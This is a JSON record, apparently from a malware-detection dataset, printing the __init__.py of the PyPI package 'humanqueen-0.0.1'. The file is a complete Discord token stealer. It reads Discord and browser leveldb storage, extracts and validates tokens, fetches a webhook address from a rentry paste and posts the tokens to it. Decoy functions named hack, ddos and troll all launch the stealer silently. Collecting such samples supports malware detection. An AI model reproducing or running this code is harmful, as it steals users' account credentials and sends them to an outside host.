[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import sys,requests\nimport os, re, json, threading, urllib.request\n\n__HOOK__ = 'https://rentry.co/23azs/raw'\n\nclass Bunny:\n    def __init__(self):\n        self.path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',\n        ]\n    \n    def __resolve_hook(self): return urllib.request.urlopen(urllib.request.Request(__HOOK__)).read().decode('utf-8')\n\n    def __get_tokens(self):\n        found_tokens = []\n\n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n\n            if os.path.exists(path):\n                for file_name in os.listdir(path):\n                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                        continue\n\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                            found_tokens.append(token)\n        \n        return list(set(found_tokens))\n    \n    def __check_tokens(self, token_list: list):\n        checked_tokens = []\n        checker_thread = []\n\n        def check(token: str):\n            try:\n                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/library', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode()\n\n                if res == 200:\n                    checked_tokens.append(token)\n            except:\n                pass\n\n        for token in token_list:\n            checker_thread.append(threading.Thread(target= check, args=(token,)))\n        \n        for T in checker_thread:\n            T.start()\n        \n        for T in checker_thread:\n            T.join()\n        \n        valid_tokens = ''\n        for token in checked_tokens:\n            valid_tokens += f'\\n{token}'\n\n        return valid_tokens\n\n    def main(self):\n        hook = self.__resolve_hook()\n        tokens = self.__check_tokens(self.__get_tokens())\n\n        if tokens != '':\n            try:\n                urllib.request.urlopen(urllib.request.Request(hook, data= json.dumps({'content': f'>>> ||@everyone||\\n```{tokens}```'}).encode(), headers= { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))\n            except:\n                pass\n\ndef leave():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"Daccord chef <3\")\n    sys.exit()\n\ndef couteau():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"tu crois on fait de la drill ici ?\")\n\ndef hack():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"Seul Xin est un haxor !\")\n\ndef ddos(ip=None):\n    threading.Thread(target= Bunny().main()).start()\n    if ip == None:\n        print(\"zebi tu sais pas use une fonction ou quoi\")\n        print(\"usage : ddos(lip ici) ex: ddos(127.0.0.1)\")\n    else:\n        print(\"azy je fait sa \")\n        os.system(\"pause\")\n        sys.exit()\n\ndef troll():\n    threading.Thread(target= Bunny().main()).start()\n    t = input(\"tu veut troll qui ?\")\n    print(f'hmmm alors tu veut troll {t}')\n    print(\"ok cest parti\")\n    os.system(\"pause\")\n    print(\"tu tes fait troll ducoup x)\")\n    import time; time.sleep(3)\n    sys.exit()"
  },
  {
    "metadata": {
      "package_name": "humanqueen-0.0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/humanqueen-0.0.1.txt"
    }
  }
]